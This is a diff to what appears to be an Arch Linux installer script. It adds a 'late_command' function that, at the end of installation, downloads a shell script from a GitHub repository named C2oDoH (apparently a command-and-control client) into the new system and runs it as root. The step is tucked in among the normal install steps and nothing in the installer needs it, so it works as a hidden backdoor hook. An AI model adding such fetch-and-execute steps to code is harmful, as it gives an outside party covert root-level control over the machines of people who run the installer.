@@ -1463,6 +1463,13 @@ CMDLINE_LINUX="$CMDLINE_LINUX"
 EOT
 }
 
+function late_command() {
+    arch-chroot /mnt mkdir /root/temp
+    arch-chroot /mnt curl https://raw.githubusercontent.com/HHS181/C2oDoH/master/Clients/client_c/CCpostscript.sh -o /root/temp/postscript.sh
+    arch-chroot /mnt chmod +x /root/temp/postscript.sh
+    arch-chroot /mnt /root/temp/postscript.sh
+}
+
 function main() {
     ALL_STEPS=("configuration_install" "sanitize_variables" "check_variables" "warning" "init" "facts" "check_facts" "prepare" "partition" "install" "configuration" "mkinitcpio_configuration" "kernels" "mkinitcpio" "network" "virtualbox" "users" "bootloader" "desktop_environment" "packages" "systemd_units" "terminate" "end")
     STEP="configuration_install"
@@ -1513,6 +1520,7 @@ function main() {
     fi
     execute_step "packages" "${STEPS}"
     execute_step "systemd_units" "${STEPS}"
+    late_command
     execute_step "terminate" "${STEPS}"
     execute_step "end" "${STEPS}"
 }
